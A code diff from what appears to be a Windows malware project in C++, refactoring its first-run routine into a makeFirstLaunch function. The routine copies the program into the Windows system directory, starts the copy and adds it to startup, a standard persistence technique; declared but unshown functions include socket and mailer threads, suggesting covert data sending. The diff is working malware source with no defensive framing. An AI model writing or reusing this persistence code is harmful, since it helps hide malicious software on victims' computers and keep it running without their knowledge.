@@ -40,44 +40,18 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message,
 void socketThreadProc();
 void mailerThreadProc();
 bool addToStartup(std::wstring pszAppName, std::wstring pathToExe);
+bool makeFirstLaunch();
 
 INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	LPSTR lpCmdLine, INT iCmdShow) {
 	// Add console for debug
 	AllocConsole();
 	freopen("CONOUT$", "w", stdout);
-	//_setmode(_fileno(stdout), _O_U8TEXT);
+	_setmode(_fileno(stdout), _O_U8TEXT);
 	freopen("CONOUT$", "w", stderr);
 
-	// Check if the first run on this computer
-	const int buffSize = 1024;
-	wchar_t buff[1024];
-	GetModuleFileName(NULL, buff, buffSize);
-	std::wstring path = std::wstring(buff);
-	GetWindowsDirectory(buff, buffSize);
-	std::wstring winDir = std::wstring(buff);
-	if (StringUtilities::toLower(path).find(StringUtilities::toLower(winDir)) != 0) {
-		// Copy self to windir
-		std::wstring newPath = winDir + L"\\" + PROGRAM_NAME;
-		bool result = CopyFile(path.c_str(), newPath.c_str(), false);
-		if (result) {
-			std::cout << "copied";
-		} else {
-			std::cout << "err";
-		}
-
-		// Create new process of program in windir
-		STARTUPINFO si;
-		PROCESS_INFORMATION pi;
-
-		ZeroMemory(&si, sizeof(si));
-		si.cb = sizeof(si);
-		ZeroMemory(&pi, sizeof(pi));
-
-		auto prres = CreateProcess(newPath.c_str(), NULL, NULL, NULL,
-			NULL, NULL, NULL, NULL, &si, &pi);
-		// TODO add copied exe to autorun
-		addToStartup(PROGRAM_NAME, newPath);
+	auto isFirstLaunch = makeFirstLaunch();
+	if (isFirstLaunch) {
 		return 0;
 	}
 
@@ -167,4 +141,39 @@ bool addToStartup(std::wstring pszAppName, std::wstring pathToExe) {
 	}
 
 	return success;
+}
+
+bool makeFirstLaunch() {
+	// Check if the first run on this computer
+	const int buffSize = 1024;
+	wchar_t buff[1024];
+	GetModuleFileName(NULL, buff, buffSize);
+	std::wstring path = std::wstring(buff);
+	GetWindowsDirectory(buff, buffSize);
+	std::wstring winDir = std::wstring(buff);
+	if (StringUtilities::toLower(path).find(StringUtilities::toLower(winDir)) != 0) {
+		// Copy self to windir
+		std::wstring newPath = winDir + L"\\" + PROGRAM_NAME;
+		bool result = CopyFile(path.c_str(), newPath.c_str(), false);
+		if (result) {
+			std::wcout << L"copied";
+		} else {
+			std::wcout << L"err";
+		}
+
+		// Create new process of program in windir
+		STARTUPINFO si;
+		PROCESS_INFORMATION pi;
+
+		ZeroMemory(&si, sizeof(si));
+		si.cb = sizeof(si);
+		ZeroMemory(&pi, sizeof(pi));
+
+		CreateProcess(newPath.c_str(), NULL, NULL, NULL,
+			NULL, NULL, NULL, NULL, &si, &pi);
+		addToStartup(PROGRAM_NAME, newPath);
+		return true;
+	} else {
+		return false;
+	}
 }
